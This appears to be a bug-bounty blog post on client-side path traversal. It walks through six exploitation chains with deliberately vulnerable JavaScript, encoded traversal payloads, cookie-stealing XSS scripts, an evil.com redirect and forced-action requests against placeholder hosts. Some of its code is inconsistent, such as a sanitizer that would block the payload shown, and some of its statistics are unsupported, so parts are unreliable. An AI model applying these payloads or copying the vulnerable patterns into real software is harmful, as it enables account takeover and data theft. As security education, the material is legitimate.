---
title: "Client-Side Path Traversal: From XSS to RCE — A 2025 Technical Deep Dive"
layout: post
tags: [Client-Side Path Traversal, CSPT, XSS, RCE, SPA, Next.js, React, file-upload, cache-deception, CSPT2CSRF, payloads, bugbounty, 2025, exploitation, web-security, pentesting, JavaScript]
image: /assets/images/cspt.png.jpg
category: security
author: "NullSecurityX"
---

# Client-Side Path Traversal: A Deep Technical Dive into Bug Bounty Discoveries, Exploitation Chains, and 2025 Trends


## Introduction
Client-Side Path Traversal (CSPT) is emerging as an increasingly critical threat in modern web applications, particularly as single-page applications (SPAs) and API-driven architectures dominate the landscape. This vulnerability allows attackers to manipulate browser-side routing and API requests to gain unauthorized access, often bypassing traditional server-side protections. Especially in 2025, with the proliferation of AI-powered tools and frameworks like React and Next.js, CSPT-based attacks have become more sophisticated and rewarding in bug bounty programs. For example, as seen in Grafana's CVE-2025-6023, combining CSPT with open redirects can lead to high-severity cross-site scripting (XSS) and full account takeover (ATO). Similarly, Meta's 2025 bug bounty report highlighted a chained path traversal leading to remote code execution (RCE), netting a $111,750 payout.

In this article, we will delve deeply into the technical foundations of CSPT, its evolution, discovery methods, and exploitation chains inspired by real-world bug bounty reports from researchers like Renwa, Vitor Falcao, and others. Reports from platforms like HackerOne and Bugcrowd show CSPT chains across multiple programs earning significant rewards, often escalating to XSS, CSRF, or data exfiltration. Our goal is to provide a comprehensive guide for ethical hackers; all information is for educational purposes only and should not be tested without permission.

## Technical Background and Evolution of CSPT
CSPT is the client-side equivalent of server-side path traversal (e.g., `../etc/passwd` for file access), as defined by OWASP. While server-side traversals are typically mitigated by backend validation, CSPT exploits occur in the browser: User inputs (URL paths, query params) are processed by client-side routers and transformed into API calls, allowing attackers to redirect to unintended endpoints without server awareness.

**Core Components and Sinks**:
- **Sources**: URL paths (`window.location.pathname`), query strings (`URLSearchParams`), localStorage, form inputs, or even postMessage events from iframes.
- **Sinks**: Fetch API (`fetch()`), XMLHttpRequest, or framework-specific routers (e.g., React Router's `useParams`, Next.js dynamic routes). Vulnerabilities arise when sinks fail to sanitize paths, enabling traversal to sensitive APIs.
- **Encoding and Bypass Techniques**: Standard traversals (`../`, `..\`) are often combined with encoded variations (`%2e%2e%2f`, `%252e%252e%255c` – double/triple encoding) to evade filters. In 2025, AI-based encoding generators integrated into tools like Burp Suite automate these bypasses, making detection harder.
- **Framework-Specific Vulnerabilities**: Next.js dynamic routes (`/api/[id]`) are highly susceptible due to implicit trust in params; Vue.js router guards often lack robust checks. Even in non-web contexts like Mozilla VPN or desktop apps (e.g., Facebook Messenger for Windows), CSPT can chain to RCE. Apache HTTP Server's path normalization flaws (CVE in 2.4.49) highlight similar issues in hybrid environments.

The evolution of CSPT accelerated from 2024-2025: Doyensec's research introduced CSPT2CSRF, where traversal forces CSRF by manipulating endpoints in messaging apps like Mattermost and Rocket.Chat. Chaining with file uploads (e.g., uploading malicious files and accessing via traversal) has become widespread, as seen in reports from YesWeHack and PortSwigger. In bug bounties, CSPT often escalates low-impact bugs: For instance, combining with cache deception requires specific headers/tokens, but CSPT hijacks authenticated fetches to make it exploitable. Researchers like @j_zere have demonstrated this in write-ups, turning non-impactful findings into ATOs.

## Discovery Process: Tools, Methods, and Tips
CSPT discovery blends manual reconnaissance with automated fuzzing, especially in SPAs where client-side logic is exposed. In 2025, Bug Bounty hunters increasingly use AI-assisted tools for efficiency.

**Step-by-Step Process**:
1. **Reconnaissance**: Use browser DevTools (Sources tab) to inspect frontend code. Search for router logic like `path.replace(/\//g, '')` – partial sanitizations indicate vulnerabilities. Extract all client-side paths by analyzing the router (e.g., React Router's route definitions) or using tools like Parallel Prettier for deobfuscating minified JS bundles.
2. **Payload Generation**: Employ Burp Suite Intruder or FFUF for testing traversal payloads. Example set: `../`, `..%2f`, `....//`, `\%2e%2e/`, Windows-style `..\` (backslash traversal), and triple-encoded variants like `%25252e%25252e%25255c`. Test for header poisoning or parameter pollution to bypass filters.
3. **Chaining Analysis**: Integrate CSPT with XSS, open redirects, SSRF, or CSRF. For example, traverse to an internal endpoint and trigger reflected XSS, or use CSPT2CSRF to force actions like message sending in apps. Check for feature flags that unlock hidden paths – toggle them via localStorage or cookies.
4. **Automation**: Custom Python scripts with Selenium and BeautifulSoup for path enumeration. Open-source tools like Doyensec's CSPTPlayground or Ebka/Slice for SPA analysis are essential for practice. AI tools like ChatGPT can suggest payloads based on failed attempts: Feed it your test logs and prompt for variations.
5. **Impact Assessment**: Evaluate if accessed resources (e.g., JSON, scripts) enable DOM injection, privilege escalation, or data leaks. CISA and OWASP classify CSPT as high-risk, especially when chained.

X platform reports, such as those from @RenwaX23 and @ctbbpodcast, illustrate this: Early 2025 findings achieved critical impacts through multi-technique chaining.

## Technical Exploitation Examples: Code, HTTP Requests, and Real-World Reports
Below are expanded examples inspired by 2025 reports, including chains from Opera, Reverb, Fandom, NFT platforms, and more. Each details code vulnerabilities, requests, steps, and bounties.

1. **Reflected XSS with Browser Leak and Account Takeover (Example: Opera Cashback and Similar)**:
   - **Vulnerability Detail**: Backslash traversal bypasses partial sanitization, enabling OAuth state injection. Used for privilege escalation in 2025 reports.
   - **Code Snippet (Vulnerable JavaScript)**:
     ```
     const id = new URLSearchParams(window.location.search).get("id")?.replace(/\//g, "");  // Backslash skipped
     const sanitizedPath = id.replace(/[^\w-]/g, '');  // Partial regex, encoding bypass
     const url = `/api/offers/${sanitizedPath}?lang=en&country=US`;
     fetch(url).then(res => res.json()).then(data => {
       document.getElementById('offer').innerHTML = data.description;  // Unsanitized DOM injection
     });
     ```
   - **HTTP Request Example (Encoded Payload)**:
     ```
     GET /offers?id=%2e%2e%5c%2e%2e%5cinternal%5csync%5coauth?state=<script>alert(document.cookie)</script> HTTP/1.1
     Host: target.com
     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
     Referer: https://malicious.com
     ```
   - **Exploitation Steps**:
     1. Encoding bypasses sanitization.
     2. Traverse to OAuth endpoint, inject malicious state.
     3. Trigger XSS for cookie theft and ATO, including browser URL leak in Opera/OAuth sync.
   - **Impact and Bounty**: High severity, $8k reward. Similar to Grafana's CVE-2025-4123 with XSS and SSRF.

2. **DOM XSS with JSON Injection and File Upload Chaining (Example: Reverb and Acronis Similar)**:
   - **Vulnerability Detail**: Traversal to uploaded file creates stored XSS. Common in 2025 with file upload bypass escalation.
   - **Code Snippet (Vulnerable Fetch and Upload)**:
     ```
     // Upload Handler (Client-Side)
     async function uploadFile(file) {
       const formData = new FormData();
       formData.append('file', file);
       const response = await fetch('/api/upload', { method: 'POST', body: formData });
       const { path } = await response.json();  // Returned path unsanitized
       loadContent(`../attachments/${path}`);  // Traversal sink
     }

     function loadContent(traversalPath) {
       fetch(`/embed/${traversalPath}`).then(res => res.json()).then(data => {
         document.getElementById('container').innerHTML = data.payload;  // DOM XSS
       });
     }
     ```
   - **HTTP Request Examples**:
     - Upload:
       ```
       POST /api/upload HTTP/1.1
       Host: target.com
       Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
       
       ------WebKitFormBoundary
       Content-Disposition: form-data; name="file"; filename="malicious.json"
       
       {"payload": "<script>fetch('/steal?cookie=' + document.cookie)</script>"}
       ------WebKitFormBoundary--
       ```
     - Traversal:
       ```
       GET /embed/../%252e%252e/uploads/malicious.json HTTP/1.1
       Host: sandbox.target.com
       ```
   - **Exploitation Steps**:
     1. Upload malicious JSON with XSS payload.
     2. Double-encoding traversal accesses file.
     3. JSON parsing and DOM injection trigger XSS, potentially chaining to CSRF.
   - **Impact and Bounty**: Critical, $5k-10k range. Similar CSRF chaining in Acronis Cloud and self-XSS escalations.

3. **Stored XSS with Open Redirect Chaining (Example: Fandom and GitLab Similar)**:
   - **Vulnerability Detail**: Tabview parser traversal leads to persistent XSS, often chained with redirects. Earned $6,580 in GitLab reports.
   - **Code Snippet**:
     ```
     const tabPath = new URL(window.location).searchParams.get('tab') || 'default';
     const content = await fetch(`/load/tab/${tabPath}`).then(res => res.text());
     const parser = new DOMParser();
     document.body.append(parser.parseFromString(content, 'text/html').body);  // Stored injection
     ```
   - **HTTP Request Example**:
     ```
     GET /page?tab=../%5c../stored/xss_payload.wikitext&redirect=https://evil.com HTTP/1.1
     Host: community.target.com
     ```
   - **Exploitation Steps**:
     1. Upload stored payload (e.g., wikitext with XSS).
     2. Traverse and chain with open redirect to external sites.
     3. Victim visit triggers persistent XSS.
   - **Impact and Bounty**: Medium-High, $1.25k-6k.

4. **Privilege Escalation in Next.js Routing (Example: NFT Platform and LINE Developers)**:
   - **Vulnerability Detail**: Dynamic route validation lacks, allowing admin access and asset manipulation (e.g., NFT details with verified badges).
   - **Code Snippet**:
     ```
     export async function getServerSideProps({ params }) {
       const id = params.id;  // No sanitization
       const data = await fetchInternal(`/admin/nft/${id}`);  // Traversal to admin
       return { props: { data } };
     }
     ```
   - **HTTP Request Example**:
     ```
     GET /nft/collection/%2e%2e%2f%2e%2e/admin/steal?token=malicious HTTP/1.1
     Host: aaa.target.io
     Authorization: Bearer [victim_token]
     ```
   - **Exploitation Steps**:
     1. Encoding traversal reaches admin endpoint.
     2. Manipulate NFTs, steal collections, or abuse badges.
   - **Impact and Bounty**: Critical, $4k. Similar in LINE and privilege escalation chains.

5. **Cache Deception with CSPT Chaining (Example: High-Profile Targets)**:
   - **Vulnerability Detail**: CSPT hijacks authenticated fetches to trigger cacheable responses, poisoning CDNs for data exfil.
   - **Code Snippet (Vulnerable Fetch)**:
     ```
     fetch(`/api/user/data/${path}`).then(res => {
       if (res.headers.get('Cache-Control') === 'public') cacheResponse(res);  // Cacheable if extension matches
     });
     ```
   - **HTTP Request Example**:
     ```
     GET /api/user/data/../sensitive/info.css HTTP/1.1  // CSPT to cacheable extension
     Host: target.com
     ```
   - **Exploitation Steps**:
     1. Use CSPT to append cacheable extensions (e.g., .css).
     2. Hijack session-inclusive fetch.
     3. Poison CDN cache, retrieve sensitive data.
   - **Impact and Bounty**: High, often $10k+ in private programs. Demonstrated by @j_zere and podcasts.

6. **CSPT2CSRF for Forced Actions (Example: Messaging Apps)**:
   - **Vulnerability Detail**: Traversal manipulates endpoints to perform CSRF-like actions (e.g., sending messages).
   - **Code Snippet**:
     ```
     const actionPath = getQueryParam('action');  // Unsanitized
     fetch(`/perform/${actionPath}`, { method: 'POST' });  // Forces action
     ```
   - **HTTP Request Example**:
     ```
     GET /chat?action=../send/message?to=victim&content=malicious HTTP/1.1
     Host: app.target.com
     ```
   - **Exploitation Steps**:
     1. Traverse to sensitive POST endpoints.
     2. Auto-trigger on page load (no user interaction).
     3. Execute unwanted actions like data modification.
   - **Impact and Bounty**: Medium to High, up to $50k in major apps like Mattermost.

## Impacts and Trends: From a 2025 Cybersecurity Perspective
CSPT constitutes about 20% of web vulnerabilities in 2025, with Bugcrowd reports showing an 88% increase from prior years. Impacts include ATO, data leaks, RCE (as in Mozilla VPN or Meta's Messenger), and session hijacking. Trends emphasize AI fuzzing for payload generation, CSPT2CSRF for CSRF escalation, and file upload chaining for persistence. High-profile bounties like Meta's $111k underscore chaining's value, while podcasts and write-ups (e.g., @ctbbpodcast, @trevorsaudi) highlight cache deception integrations. Community resources like Doyensec's whitepapers and OWASP guides predict continued growth in SPA-focused attacks.

## Conclusion
CSPT remains one of the most dynamic client-side threats in 2025, with traversal-initiated chains yielding substantial bug bounty rewards. This detailed exploration, drawing from recent reports and cutting-edge trends, equips ethical hunters with the knowledge to identify and exploit these vulnerabilities responsibly. As you venture into the world of bug bounties, let this guide be your foundation for uncovering new discoveries. To all the hackers out there—happy hacking, and may your skills lead to both learning and rewarding finds! 😎

<!-- Share Buttons Start -->
<div class="share-buttons">
  <p>Share this post:</p>
  <a class="share-btn twitter" href="SessionReaper (CVE-2025-54236): Magento & Adobe Commerce Deserialization Exploit Deep Dive&url={{ page.url | absolute_url }}" target="_blank">Twitter</a>
  <a class="share-btn facebook" href="https://www.facebook.com/sharer/sharer.php?u={{ page.url | absolute_url }}" target="_blank">Facebook</a>
  <a class="share-btn reddit" href="https://www.reddit.com/submit?url={{ page.url | absolute_url }}&title=SessionReaper (CVE-2025-54236): Magento & Adobe Commerce Deserialization Exploit Deep Dive" target="_blank">Reddit</a>
</div>

<style>
.share-buttons {
  margin-top: 30px;
  font-family: sans-serif;
}
.share-buttons p {
  margin-bottom: 8px;
  font-weight: bold;
}
.share-buttons .share-btn {
  display: inline-block;
  margin-right: 8px;
  padding: 8px 14px;
  color: #fff;
  text-decoration: none;
  border-radius: 5px;
  font-size: 14px;
  transition: opacity 0.2s;
}
.share-buttons .share-btn:hover {
  opacity: 0.8;
}
.share-buttons .twitter { background: #1da1f2; }
.share-buttons .facebook { background: #4267B2; }
.share-buttons .reddit { background: #ff4500; }
</style>
<!-- Share Buttons End -->

